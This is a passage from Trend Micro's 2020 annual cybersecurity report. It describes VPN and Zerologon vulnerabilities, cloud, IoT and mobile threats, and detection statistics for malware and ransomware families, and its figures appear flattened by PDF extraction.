some organizations might have already had some form of remote work option in place for employeesbefore the pandemic, migrating the majority of workers to the same setup meant having to stress-testcritical systems to ensure that they would operate effectively even under heavy loads.45 Furthermore,organizations also had to ensure that their employees were provided all the support and training theyneeded to work effectively from home. There was also a need to look beyond infrastructure. To help closesecurity gaps, enterprises needed to introduce or reinforce policies that focused on security and thatwould help remote workers secure their own home workspace.To that end, virtual private networks (VPNs) became indispensable tools for organizations in protectingnetwork connections from external threats. In fact, bolstered by the WFH arrangements implemented byorganizations around the world, usage of VPNs reached an all-time high in 2020.4620 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportIt is important to note, however, that VPNs are not the be-all and end-all of security technology. They canbe and are abused by malicious actors for cyberattacks. Like any software, VPN solutions could alsobe host to various vulnerabilities, which, if exploited, could provide attackers ways to compromise theirtargets\u2019 systems.One of the most notable and widespread VPN vulnerabilities is CVE-2019-11510, a critical arbitrary filedisclosure flaw in the VPN product Pulse Connect Secure that could allow remote attackers to obtainusernames and plain-text passwords from affected machines.47 Despite being relatively new, CVE-2019-11510 already accounted for nearly 800,000 detections in 2020 alone. It had already been involved inactual attacks, including ones in 2020 where it was exploited to deliver the Sodinokibi ransomware.48CVE-2019-11539 CVE-2019-11510 CVE-2018-13379FortinetPulse SecureCVE-2018-13379CVE-2019-11510CVE-2019-11539Citrix Systems CVE-2019-19781100K88,51563,83162,93160,85157,54366,17668,94269,90568,24880,89763,34773,65772,84344,17239,03244,71740,11725,05315,8349,86418,31214,91020,89727,1101,1437113602,7042,9282,7883,4782,7562,980749 73770 571,149JANFEBMARAPRMAYJUNJULAUGSEPOCTNOVDECFigure 17. The detections for CVE-2018-13379 rose sharply in the fourth quarter, while the opposite occurred for CVE-2019-19781; detections for the Pulse Secure vulnerability CVE-2019-11510 remained fairly consistent on aper-month basis: A monthly comparison of the detection counts of notable VPN vulnerabilities in 2020Source: Trend Micro Digital Vaccine filtersMalicious actors also found other ways to incorporate VPNs in their attacks. In September, we publishedour analysis of an instance where an attacker bundled a VPN installer with the Bladabindi backdoor, whichcould be used to gather information from infected machines.49 Cases like this show that, in addition toupdating their VPN software regularly to ensure that existing vulnerabilities are addressed, VPN usersshould be mindful of where they download their software.21 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportThe transition to remote work also led to increased reliance on communication tools such as Zoom, Slack,and Discord. This, in turn, led to an increase in attacks that targeted or used these applications.50\u201cZoombombing,\u201d in which unwanted users would intrude on ongoing Zoom meetings, was one of themore common methods of communication app abuse. And while it could be highly disruptive at times,ultimately most instances of Zoombombing amounted to nothing more than harmless, if annoying, pranks.Other types of Zoom-related attacks, though, were more damaging. Some malicious actors resorted tousing Zoom installers \u2014 either legitimate ones bundled with malware or malware disguised as installers\u2014 to trick users into installing various payloads on their machines.51Slack and Discord were also incorporated by cybercriminals into their attacks. One of these involvedCrypren, a ransomware variant that had a unique method of reporting its victims\u2019 encryption status backto the command-and-control (C&C) server: via Slack webhooks. We also found samples showing howDiscord was used in an email spam campaign that delivered malware to its victims\u2019 machines.5222 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportOrganizations Face Threats in Cloud, IoT, and Mobile Environments Cloud Misconfiguration Is Still a Problem for Many OrganizationsIn 2020, the cloud became an even more integral part of the operations of many organizations. Accordingto the 2020 Cyber Risk Index, the area of cloud computing infrastructure and providers was ranked asone of the chief areas of concern for organizations.53The cloud has indeed become critical to a properly functioning enterprise, even more so in a remoteworking environment. Cloud-based services offer many benefits to enterprises, especially with regard tocost efficiency, agility, and scalability. However, it would be a mistake to consider the cloud as a turnkeysolution that organizations should not have to worry about in terms of security. Securing the cloud isnot without its own set of challenges.54 One aspect of cloud infrastructure that is often overlooked is theproper configuration of cloud assets and services, leading to misconfiguration remaining a major risk incloud environments, as seen in the various incidents in 2020 that were primarily caused by misconfiguredcloud software and infrastructure.Traditionally, malicious actors use vulnerability exploitation to execute remote code, a crucial step ingaining a foothold in a target system. However, some of the incidents we observed in the past yearinstead involved attackers looking for open APIs to exploit. In April, it was reported that attackers haddropped cryptocurrency miners on misconfigured Docker daemon API ports via the Golang-based Kinsingmalware. One notable characteristic of Kinsing is its ability to hide the presence of malicious componentsthrough the use of a rootkit, making its activities even more difficult to detect for affected users.55A month later, we analyzed a bot from the threat actor group TeamTNT that was designed to minecryptocurrency and perform distributed denial-of-service attacks.56 The main target of this bot was, again,23 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Reportopen Docker daemon ports. And toward the end of the year, we observed more malicious activitiesfrom the group as it evolved its attacks further. Its December attack saw the group adding propagationfunctionalities and the ability to steal Amazon Web Services (AWS) Secure Shell (SSH) credentials.57However, none of these attacks would have been possible without some form of misconfiguration orsecurity gap in the infected system. In these cases, the group needed to perform remote code executionon the system by taking advantage of instances of misconfiguration, weak or stolen credentials, orvulnerabilities.In October, we also reported on a unique attack on exposed Docker APIs that involved the use of theMetasploit Framework (MSF) shellcode as a payload \u2014 the first time we observed the use of such atechnique.58 This is notable since a typical attack on exposed Docker APIs involves cryptocurrency miners.Cybercriminals Take Advantage of Underground Cloud InfrastructureIronically, it is not just enterprises that benefited from cloud services in 2020, as we found in our extensiveresearch into how malicious actors used the cloud in the past year.In the cybercriminal underground, malicious actors regularly interact and deal with one another. There areeven cases where cybercriminals work with one another to perform various tasks \u2014 for example, onegroup or individual can be responsible for accessing a victim\u2019s system, while another group provides theC&C infrastructure \u2014 essentially commodifying underground services. There is also an extensive list ofcloud-based services being peddled in the underground. These range from simple dedicated hostingservices to more niche offerings such as mobile workspaces and telecommunication-related services, allof which could help malicious actors with their activities.59In recent times, we have seen a number of attacks where data is stolen by cybercriminals. Often theamount of stolen data is such that individual cybercrime groups are unable to fully use all the informationeven if they want to. As a result, some underground elements have resorted to renting out their \u201ccloudsof logs\u201d to other cybercriminals.60Some of these offerings even have pricing models, depending on the level of access they provide. Thedata found in these sets also varies, with the typical contents being personally identifiable information(PII), user credentials for various cloud services, and credit card information.24 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportFigure 18. A dataset being sold in the underground at varying prices, including a US$900 \u201clifetime membership\u201dOne of the primary advantages provided by these types of services is that they give malicious actors theability to process and manage enormous amounts of data without the need to have complex infrastructure.The easy access to this information means that attacks can occur faster and more efficiently. This isespecially useful in targeted attacks, where threat actors could find the information that they need withouthaving to spend substantial time and effort in gathering it.As participants continue to refine and evolve this underground market, we can expect to see organizationsat greater risk from their data being stolen, especially since the use of services sold in this space meansthat the gap between the theft and the actual attack becomes much shorter.Attacks on IoT Devices IncreasedIn addition to the cloud, the IoT also played a key role in many organizations\u2019 shift to remote work \u2014 andsure enough, malicious actors also took notice.As we noted in our security predictions for 2021, malicious actors will increasingly focus on home networksas they try to find ways into their targets\u2019 systems.61 Compromised home networks and devices couldserve as launching points for attackers before they jump to other devices with the eventual goal of gainingaccess to the corporate networks the devices are connected to. Routers are particularly vulnerable25 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Reportto remote attacks, especially since the security at an employee\u2019s home is not as robust as that at anenterprise workplace.Based on our detections, inbound attacks possibly occurred on 15.5% of routers while 5.1% of routerswere possibly used for outbound attacks in 2020.Figure 19. In 2020, 15.5% of routers were possibly victimized while 5.1% were possibly compromised.Note: Data is based on the percentages of detected inbound attacks (routers as victims) and outbound attacks(routers as attackers).Source: Trend Micro\u2122 Smart Home Network solutionIn the past year, we also saw an uptick in the total number of inbound attack events, which was morethan triple the 2019 tally, and in the total number of outbound attack events, which nearly doubled from2019. Furthermore, the number of internet-connected devices on which we detected possible inboundattacks and the number of those that might have been used for possible outbound attacks both increased.We also saw more routers (which the internet-connected devices were connected to) being targeted bypossible inbound attacks or being used for possible outbound attacks.26 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportPossible inbound attacksRouters on which possibleinbound attacks weredetectedInternet-connected devices on which possible inboundattacks were detected3B02,878,216,4791.5M1,492,4092.5M1,141,2852,027,6461,561,779929,084,56420192020201920202019202000Figure 20. There was a significant increase in possible inbound attacks, and the numbers of internet-connecteddevices and routers on which possible inbound attacks were detected also increased: A comparison of thedetection counts of possible inbound attacks and affected routers and devices in 2019 and 2020Note: Events were when rules were triggered for activities or behaviors from malicious, gray, and potentiallyunwanted applications, and were indicators that attacks might happen. Possible attacks were eventsclosely related to threat activity.Source: Trend Micro Smart Home Network solutionOutbound attacksRouters that might have been used for possibleoutbound attacksInternet-connected devices that might have been usedfor possible outbound attacks200M196,012,782250K228,215300K167,498210,289257,62699,266,382000201920202019202020192020Figure 21. There were growths in the number of possible outbound attacks and the numbers of internet-connecteddevices and routers that might have been used for possible outbound: A comparison of the detection counts ofpossible outbound attacks and affected routers and devices in 2019 and 2020Note: Events were when rules were triggered for activities or behaviors from malicious, gray, and potentiallyunwanted applications, and were indicators that attacks might happen. Possible attacks were eventsclosely related to threat activity.Source: Trend Micro Smart Home Network solution27 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportBrute-force attempts made up a significant portion of the inbound attacks, indicating that user credentialswere attackers\u2019 most preferred target in 2020.NETBIOS SMB username brute-force attemptRDP brute-force loginNETBIOS SMB authorization failureSMB Microsoft Windows SMB server SMBv1 CVE-2017-0147 information disclosure -1WEB remote command execution via shell script -1.hSIP Asterisk PJSIP endpoint presence disclosure (CVE-2018-12227)MALWARE suspicious IoT worm Telnet activity -1FILE Android libstagefright mp4 tx3g Atom multiple buffer over\ufb02ow -1WEB GoAhead login.cgi information disclosure vulnerability1,407,789,562618,498,867523,301,68574,352,26446,037,02940,324,77219,928,76518,215,82716,203,529SSH brute-force login13,398,00601.5BFigure 22. Brute-force login attempts were the top two inbound attack events:A comparison of the detection counts of the top 10 event rules triggered by possible inbound attacks in 2020Note: Events were when rules were triggered for activities or behaviors from malicious, gray, and potentiallyunwanted applications, and were indicators that attacks might happen. Possible attacks were eventsclosely related to threat activity.Source: Trend Micro Smart Home Network solutionA similar story can be seen for outbound attacks, where NetBIOS Server Message Block (SMB) usernamebrute-force attempts accounted for the highest number. Microsoft Windows SMB attacks, includingexploitation of WannaCry vulnerabilities, were a close second.28 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportNETBIOS SMB username brute-force attemptMicrosoft Windows SMB server SMBv1 CVE-2017-0147 information disclosure vulnerabilitySSH brute-force login attemptNETBIOS SMB authorization failureSMB Windows SMBv2 information disclosure vulnerability (CVE-2019-0703)RDP brute-force loginWEB remote command execution via shell script -1.hWEB ACME mini_httpd arbitrary \ufb01le read (CVE-2018-18778)MALWARE suspicious IoT worm Telnet activity -1FTP brute-force login -2.102173,201,91964,061,1236,464,6825,724,5855,443,8404,758,8244,302,9623,348,9953,143,9282,470,387080MFigure 23. Brute-force login attempts were among the most common methods used in outbound attacks:A comparison of the detection counts of the top 10 event rules triggered by possible outbound attacks in 2020Note: Events were when rules were triggered for activities or behaviors from malicious, gray, and potentiallyunwanted applications, and were indicators that attacks might happen. Possible attacks were eventsclosely related to threat activity.Source: Trend Micro Smart Home Network solutionThere were several noteworthy IoT incidents from the first half of the year, some of which, such asUrgent/11 and Ripple20, we had covered in our midyear cybersecurity report.62 In the second half of theyear, researchers from Forescout disclosed Amnesia:33, a set of 33 vulnerabilities affecting open-sourceTCP/IP stacks deployed in a large number of IoT devices worldwide, including industrial internet-of-things(IIoT) devices. Exploitation of these vulnerabilities could enable attackers to take control of devices andabuse them for malicious activities such as creating an entry point to get into a network or for lateralmovement.63What makes Amnesia:33 especially troubling is that the affected TCP/IP stacks \u2014 which include Nut/Net,FNET, picoTCP, and uIP \u2014 are not from a single company. Considering the number of devices from differentcompanies that could be affected, the vulnerabilities could spread at a rapid rate. Furthermore, trackingthe bugs and assessing their impact could prove difficult because of the scope of the vulnerabilities andbecause the potentially affected systems might be highly modular, lack any kind of documentation, or nolonger even be supported.6429 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportVulnerabilities like those found in Amnesia:33 could have significant impact, not just on the users of theaffected devices but also on the supply chain as a whole. It is not difficult to imagine a situation similar tothe SolarWinds attack where malicious actors gain access to their target via vulnerable devices from anorganization that is part of the supply chain.As for the more common IoT threats, among the most notable were the variants of the Mirai botnetmalware, which had been accruing greater infamy since its discovery in 2016,65 that we observed inthe past year. In July, we reported on our discovery and analysis of a Mirai variant that exploited ninevulnerabilities, a mix of old and new, most notably CVE-2020-10173, a multiple authenticated commandinjection vulnerability in Comtrend VR-3033 routers.66 Later that month, we reported on our examination ofanother Mirai variant, which exploited CVE-2020-5902, an F5 BIG-IP Traffic Management User Interface(TMUI) remote code execution vulnerability.67Mobile Malware Becomes Stealthier Despite Decrease in Malicious AppsWe saw a 41% decline in the number of mobile apps that we blocked in 2020, compared to thecorresponding number from 2019. On the other hand, the number of mobile device-related malicioussamples that we detected grew by 67% from the previous year. One possible reason for this discrepancymight be that malicious actors targeted mobile devices (either directly or indirectly) via methods that didnot involve their apps, such as phishing pages or social media messages.60M59,984,72335,156,917020192020Figure 24. There was a 41% year-on-year decrease in blocked mobile apps, a possible indication that malicious actors did not focus too much on deploying malicious apps this year: A comparison of the numbers of blockedmalicious Android apps in 2019 and 2020Source: Trend Micro Mobile App Reputation Service30 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Report8M4,721,6407,880,048020192020Figure 25. Despite the decrease in blocked mobile apps, mobile device-related malicious samples saw a 67%year-on-year increase, perhaps because malicious actors employed methods of infecting mobile devicesother than malicious apps: A comparison of the numbers of detected mobile device-related malicious samplesin 2019 and 2020Source: Trend Micro Mobile App Reputation ServiceAlthough mobile device attacks were overshadowed by other cybersecurity incidents, there were stillseveral noteworthy mobile threat stories from the past year. In November, we examined a new variantof the Joker malware that was contained in a wallpaper app offering HD and 4K wallpapers. This Jokervariant was notable for incorporating GitHub pages and repositories as a method of evading detection.68Instead of its past behavior of using application class and launcher activity, the new variant instead injectscode into a new location. Furthermore, its use of GitHub serves a double purpose of facilitating stealthymalicious activity while also housing the payload. What makes this variant particularly nefarious is thatit is contained in a functioning app, which, when combined with the variant\u2019s other obfuscation features,makes it difficult for victims to detect that they have already been infected.We also looked into how Android malware obfuscation is evolving via an in-depth analysis of Geost andits multiple layers of obfuscation, noting that the malicious actors behind the malware are continuouslyinvesting in and improving it.69 However, we also noted that the changes found in the code did not yetseem to have much of an impact on the actual quality of the obfuscation and, in turn, on the detectionrate.31 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportA Greater Number of Dangerous More Risky Flaws Are Disclosed Even as Older Bugs Are Still Being Actively ExploitedIn 2020, the Trend Micro\u2122 Zero Day Initiative\u2122 (ZDI) program published advisories on 1,453 vulnerabilities,a 40% increase from 2019. Of these, 173 were rated with critical severity and 983 with high severity, basedon the Common Vulnerability Scoring System (CVSS).70 The critical- and high-severity vulnerabilitiessaw significant spikes from the 2019 numbers. Because of the dangers they could pose to enterprises,critical- and high-severity vulnerabilities need to be patched as soon as possible, potentially adding tothe workloads of IT teams.1,5001,0351,453020192020Figure 26. The number of published vulnerability advisories increased year on year by 40%:A comparison of the numbers of disclosed vulnerabilities in 2019 and 2020Source: Trend Micro\u2122 Zero Day Initiative\u2122 program32 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Report1K583191 LowFigure 27. Critical- and high-severity vulnerabilities saw spikes in numbers, which could mean heavierworkloads for IT teams due to patching issues: A comparison of the severity breakdown,based on the CVSS, of disclosed vulnerabilities in 2019 and 2020Source: Trend Micro Zero Day Initiative programBased on our data on the top exploited vulnerabilities from 2017 to 2020, vulnerabilities from as far backas 2005 were still being heavily exploited. What this signifies is that organizations should not assume thattheir systems are automatically safe from exploitation of old vulnerabilities and should always be vigilantin patching their software.60M30M51,316,46330,251,19922,409,5165,421,477 4,982,852 4,024,250 3,848,442 1,692,063 1,397,075 1,397,075CVE-2005-1380CVE-2009-2532CVE-2010-0817CVE-2010-3936CVE-2011-1264CVE-2014-3567CVE-2017-0068CVE-2017-10986CVE-2017-14100CVE-2019-122502017201820192020Figure 28. The age of vulnerabilities did not matter to malicious actors, as vulnerabilities from as far back as 2005 were still among the most exploited: A comparison of the detection counts ofthe 10 most exploited vulnerabilities from 2017 to 2020Note: CVE-2010-3936 and CVE-2017-0068 use the same filter ID and therefore have the same numbers.Source: Trend Micro Digital Vaccine filters33 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportZerologon Bug Emerges, Potentially Allowing Attackers to Take Over Entire NetworksOne of the most prominent vulnerabilities discovered in 2020 was CVE-2020-1472.71 It was dubbedZerologon because the flaw exists in the logon process for servers that use NT Lan Manager (NTLM):Ideally, the code behind the process should always be a random number, but in Zerologon\u2019s case, itcontains four zeroes.72Zerologon is a dangerous bug with active proof-of-concept (POC) exploits; its severity is rated 10 out of10 on the CVSS. It exploits a flaw in Microsoft\u2019s Active Directory (AD) Netlogon Remote Protocol (MS-NRPC) that gives users the ability to log on to servers that are using NTLM.73 Given that MS-NRPC is alsoused to transmit account changes and passwords, it is clear to see why it could become problematic.Zerologon could allow an attacker to take control of a domain controller by either changing or removing thepassword used for a service account on the controller, after which the attacker could perform maliciousactions such as launching a denial-of-service attack or even taking over the entire network. By usingthe publicly available POC exploits, the attacker could perform even more damaging activities such asinfecting the affected system with ransomware.74Microsoft released an initial patch for Zerologon in August 2020 and a second patch in February2021.75 The first update blocks domain controllers from using unsecured remote procedure call (RPC)communications, while the second update enables enforcement mode on domain controllers by defaultto block vulnerable connections from noncompliant devices.7634 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportModern Threats Require Comprehensive Defense Strategies and Multilayered Security TechnologiesEnterprises are facing major security risks from determined threat actors who do not shy away fromusing every tool and trick in their arsenal. This is compounded by the unique situation in which manyorganizations have found themselves in, having to secure both the physical and virtual workspaces amida worldwide pandemic.In today\u2019s complex working environment, where the lines between the home and the office have beenblurred, the right technologies are essential for building a robust security profile. Instead of relying onsingle layers of protection, each of which covers only a portion of the overall infrastructure, organizationsshould consider a strong multilayered security. The solution should offer a wide range of capabilities \u2014including detection, investigation, and response \u2014 and provide comprehensive protection throughout thewhole system \u2014 from emails and endpoints to servers, networks, and even cloud workloads.In addition to the technological factors and issues, the pandemic has had a significant effect on theperformance of security operation centers (SOCs). Aside from having to ensure that the right technologicalpieces are in place for a secure working environment, security professionals also have to deal withincreased workloads that could lead to burnout.77 A proper multilayered security solution should give ITstaff and security personnel the ability to gain insights into the nature of the threats they are facing. Theuse of technologies such as machine learning and behavior monitoring can help organizations focus onthe most critical aspects of security without needing to go through a sizeable amount of data.Enterprises should combine these technologies with the right security strategies and policies. Even withthe emergence of increasingly complex attacks, phishing and social engineering remain to be commoninfection vectors for most malicious actors \u2014 from inexperienced amateurs to even the most skilledgroups. Organizations should therefore consider investing in the training of their workforce with regard toidentifying the most prevalent phishing and social engineering techniques.7835 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportOrganizations should also conduct regular security audits to ensure that their physical and cloudinfrastructures are free of instances of misconfiguration and other weak points. They should also performperiodic data sweeps to help detect early warning signs such as first-stage malware and tools that areusual precursors to the actual payloads.Furthermore, given how supply-chain attacks are now being used regularly by malicious actors, it isimportant for companies to evaluate the security of their suppliers and other partners and, if possible,work with them to create strong defenses against these attacks.The need for timely and efficient patch management cannot be stressed enough. Vulnerabilities such asZerologon prove that the best time for updates is as soon as the updates become available. However, thereality is that patching is not as simple as it seems. It takes considerable time to update the whole system,and the existence of zero-day vulnerabilities further complicates matters. To help with this, enterprisescan consider using technologies that offer virtual patching to bolster security while implementing updatesor waiting for fixes to be rolled out.79For most organizations, the issue of migrating their workforce from the physical office to the home issomething that has been dealt with in some manner. The pressing need for most enterprises now is theneed to sustain their operations while taking into account the technologies, the importance of security,and the human point of view.36 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportThreat Landscape in ReviewIn 2020, the Trend Micro\u2122 Smart Protection Network\u2122 infrastructure protected users from more than 62billion threats consisting of email threats, malicious files, and malicious URLs.62,637,731,995blocked threats in 2020Blocked email threatsBlocked malicious \ufb01lesBlocked malicious URLs35B31,436,659,17725,825,951,75301H2H3B02,670,438,897969,254,2321B707,420,9621,028,006,9741H2H01H2HEmail reputation queriesFile reputation queriesURL reputation queries50B43,471,552,69336,271,603,94401H2H1T0815,199,696,2811.5T1,332,207,264,639708,757,638,2331,006,547,423,4051H2H01H2HFigure 29. While nearly every metric for blocked threats and reputation queries increased from thefirst to the second half of the year, the increase in blocked malicious files was particularly substantial:A comparison of the numbers of blocked email, file, and URL threats, and of email, file, andURL reputation queries in the first and second halves of 2020Source: Trend Micro Smart Protection Network infrastructure37 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportThe top 10 malware families in terms of detections in 2020 included familiar names, with WannaCry,Coinminer, and Emotet making up the top three. WannaCry, aside from being the top malware family, isthe only ransomware in the list. Cryptocurrency miners as a whole are in second place, showing howprevalent they had become. The majority of the top 10 are made up of older families that, despite theirage, were still responsible for a large number of infections.WannaCry 220,166 Emotet160,049134,444120,29590,07686,78283,60677,50571,92058,026PowloadDownadEquatedViruxNemucodSalityDloader0250KFigure 30. The WannaCry ransomware remained the top threat, with cryptocurrency miners as a wholein second place: The 10 most detected malware families in 2020Source: Trend Micro Smart Protection Network infrastructureOur data on the top cryptocurrency miners in 2020 reveals that the top three entries alone accounted formore than 120,000 detections.MalXMR 76,99726,81422,67210,6756,9073,3242,5402,3971,369760CoinhiveCoinminerCoinmineToolXMRCryptoNightMalrepMalBTCEthereumTooleth080KFigure 31. MalXMR, Coinhive, and Coinminer were the most detected cryptocurrency miners, accounting for morethan 120,000 between the three of them: The 10 most detected cryptocurrency miners in 2020Source: Trend Micro Smart Protection Network infrastructure38 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportIn 2020, we detected more than 2.3 million endpoints that connected to C&C servers, while we detectedjust over 100,000 botnet C&C servers. The large number of servers could be attributed either to maliciousactors that were using C&C servers as part of their operations or to groups that were using increasinglycomplex C&C infrastructure. On the other hand, the number of botnet connections we detected from oursensors alone suggests that there could have been millions of potential victims.2,370,7892.5M105,7190BotnetconnectionsBotnetC&C serversFigure 32. We detected over 2.3 million botnet connections and over 100,000 botnet C&C servers:The numbers of detected botnet connections and botnet C&C servers in 2020Note: Botnet connections were unique endpoints that queried or connected to C&C servers,while botnet C&C servers were unique and active C&C servers that endpoints queried or connected to.Source: Trend Micro Smart Protection Network infrastructureThere were 127 new ransomware families discovered in 2020, a 34% increase from the 95 found in 2019.80Egregor, despite having its initial detection occur only in September, managed to rank in the top 10ransomware families of 2020, as shown in Figure 1.15012795020192020Figure 33. New ransomware families increased year on year by 34%:A comparison of the numbers of new ransomware families in 2019 and 2020Source: Trend Micro Smart Protection Network infrastructure39 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportJANFEBMARAPRMAYAkoLockerAntefrigusBBAvestBalaclavaBitPyLockerCaiKeslanZeoticusCrypenCodeCryptopxjCrytoxCorvinaMadoNefilimPysaTriplemDemonCryptWannaRenFTCodeLedifMakopMorrisbatchcryptOnyxLockerRagnarokRanscrapeTrsomwareWannaCashWannaScreamWilboyBallisticBearCryptPonyFinalGonnaCryCoronawinlockerCoronaLockColdLockBlueCheeserCreepyCryLockGeminiceJestLbkutOnaLockerOoglegoSadogoSfile2UpperVoidWreathJUNZorabWorldCrySuchCryptSapphireQrnaLockPowLockLocmentLickyAgentKrygoFunicornFreefilEscalCyberThanosChimeraBlackMoonBlackKingdomBlackClawAvaddonJULAUGSEPOCTNOVDECXinofTappifWhoLockerSunCryptAidsntBitMinerDoowtarHiddeneargdarmerieAgeLockerEyeCryLockerRanzyLockerAlolWastedlockerSilvertorBlackKnightHibunielWoodRatBacuCryptThiefQuestRagnarLockerBlackSquidJarCryptStrongPityGiveMeTheKeyCoronaCryptorLeakTheMallFlyingShipDogeCryptPay2KeyDuskEricaGodraHwruRedRomanStingJarVaggenPojiePantherLolkekExorcistDarkSideJosephNullCryptoLockEvilQuestBigLockCryCryptorBeadEgregorRegretLockerSantaCryptExxGavHexaCryptMountLocketReadManThanosVashsorenaViluciwareZhenTable 4. 127 new ransomware families were discovered: New ransomware families detected in 2020Sources: Trend Micro Smart Protection Network infrastructure and analysis of externally sourced data40 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportOf our more than 11 million detections of file types used in spam email attachments in 2020, PDFaccounted for nearly half. XLSX and HTML also had sizeable detection counts.TOTAL11,168,447PDF 1.9%Figure 34. PDF files accounted for nearly half of spam email attachments:The distribution of file types used in spam email attachments in 2020Source: Trend Micro Email Reputation ServicesWhile Windows-based operating systems still make up the majority of machines that were detected tohave some form of malware infection, a sizeable number of macOS and Linux machines also sufferedsimilarly.Windows 10 HomeWindowsWindows 7 Ultimate Professional Service Pack 1Windows 10 ProWindows 7 Home Premium Service Pack 1 macOS Windows 7 Professional Service Pack 1Windows 8.1Windows 7 Ultimate Service Pack 1 Linux04,090,0533,793,1392,146,3291,525,205953,759886,485617,179570,611360,517127,1995MFigure 35. Both macOS and Linux accounted for fairly significant numbers of malware infections, with macOS ranking higher than certain versions of Windows: The top 10 operating systems based on malware infectionsdetected on machines in 2020Source: Trend Micro Smart Protection Network infrastructure41 | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity ReportReferences1 Trend Micro. (Sept. 15, 2020). Trend Micro. \u201cBoosting Impact for Profit: Evolving Ransomware Techniques for Targeted Attacks.\u201d Accessed on Jan. 15, 2021, at url evolving-ransomware-techniques-for-targeted-attacks.html.2 Catalin Cimpanu. (April 21, 2020). ZDNet. \u201cHere\u2019s a list of all the ransomware gangs who will steal and leak your data if youdon\u2019t pay.\u201d Accessed on Jan. 15, 2021, at url steal-and-leak-your-data-if-you-dont-pay.3 Coalition, Inc. (n.d.). Coalition. \u201cCyber Insurance Claims Report.\u201d Accessed on Jan. 15, 2021, at url Trend Micro. (Feb. 4, 2020). Trend Micro Security News. \u201cRyuk Ransomware Infects US Government Contractor.\u201d Accessed on Jan. 15, 2021, at url infects-us-government-contractor.5 Cybersecurity & Infrastructure Agency. (Nov. 2, 2020). Cybersecurity & Infrastructure Agency. \u201cRansomware Activity Targetingthe Healthcare and Public Health Sector.\u201d Accessed on Jan. 15, 2021, at url HHS Cybersecurity Program. (Nov. 11, 2020). HHS Cybersecurity Program. \u201cTrickBot, Ryuk, and the HPH Sector.\u201d Accessedon Feb. 3, 2021, at url Greg Foss. (Oct. 30, 2020). Carbon Black. \u201cTAU Threat Advisory: Imminent Ransomware threat to U.S. Healthcare and Public Health Sector.\u201d Accessed on Feb. 3, 2021, at url threat-to-u-s-healthcare-and-public-health-sector.8 Trend Micro. (March 14, 2019). Trend Micro. \u201cExamining Ryuk Ransomware Through the Lens of Managed Detection andResponse.\u201d Accessed on Feb. 3, 2021, at url examining-ryuk-ransomware-through-the-lens-of-managed-detection-and-response.9 Trend Micro. (Nov. 4, 2020). Trend Micro. \u201cRyuk 2020: Distributing Ransomware via TrickBot and BazarLoader.\u201d Accessed on Jan. 15, 2021, at url ransomware-via-trickbot-and-bazarloader.10 Trend Micro. (Aug. 26, 2020). Trend Micro. \u201cSecuring the Pandemic-Disrupted Workplace.\u201d Accessed on Feb. 8, 2021, aturl disrupted-workplace-trend-micro-2020-midyear-cybersecurity-report.11 Trend Micro. (Dec. 14, 2020). Trend Micro. \u201cEgregor Ransomware Launches String of High-Profile Attacks to End 2020.\u201dAccessed on Jan. 15, 2021, at url high-profile-attacks-to-en.html.12 Tomas Meskauskas. (Oct. 29, 2020). Security Boulevard. \u201cEgregor: Sekhmet\u2019s Cousin.\u201d Accessed on Jan. 15, 2021, at url CISO Mag. (Nov. 3, 2020). CISO Mag. \u201cAre We Really Out of the Maze? The Ransomware Gang Announces Retirement.\u201dAccessed on Feb. 8, 2021, at url Trend Micro. (Dec. 14, 2020). Trend Micro. \u201cEgregor Ransomware Launches String of High-Profile Attacks to End 2020.\u201dAccessed on Jan. 15, 2021, at url high-profile-attacks-to-en.html.15 Trend Micro. (Jan. 5, 2020). Trend Micro. \u201cAn Overview of the DoppelPaymer Ransomware.\u201d Accessed on Jan. 15, 2021, aturl Federal Bureau of Investigation, Cyber Division. (Dec. 10, 2020). Internet Crime Complaint Center. \u201cDoppelPaymerRansomware Attacks on Critical Infrastructure Impact Critical Services.\u201d Accessed on Jan. 15, 2021, at url Media/News/2020/201215-1.pdf.17 Trend Micro. (Aug. 13, 2020). Trend Micro. \u201cBitPaymer Malware Information.\u201d Last accessed on Jan. 24, 2021, at url Process Hacker. (n.d.). Process Hacker. \u201cProcess Hacker.\u201d Accessed on Jan. 15, 2021, at url | A Constant State of Flux: Trend Micro 2020 Annual Cybersecurity Report19 Ryan Flores. (Dec. 1, 2020). Trend Micro. \u201cThe Impact of Modern Ransomware on Manufacturing Networks.\u201d Accessed on Jan. 19, 2021, at url networks.html.20 Leandro Froes. (Jan. 6, 2021). Trend Micro. \u201cExpanding Range and Improving Speed: A RansomExx Approach.\u201d Accessedon Feb. 4, 2021, at url approach.html.21 Nelson William Gamazo Sanchez et al. (Oct. 19, 2020). Trend Micro. \u201cOperation Earth Kitsune: Tracking SLUB\u2019s CurrentOperations.\u201d Accessed on Jan. 15, 2021, at url earth-kitsune-tracking-slub-s-current-operations.22 Nelson William Gamazo Sanchez et al. (Oct. 28, 2020). Trend Micro. \u201cOperation Earth Kitsune: A Dance of Two NewBackdoors.\u201d Accessed on Jan. 15, 2021, at url dance-of-two-new-backdoors.html.23 Trend Micro. (Jan. 5, 2021). Trend Micro. \u201cEarth Wendigo Injects JavaScript Backdoor to Service Worker for Mailbox Exfiltration.\u201d Accessed on Jan. 15, 2021, at url javascript-backdoor-to-service-worker-for-.html.24 Joseph C Chen, Jaromir Horejsi, 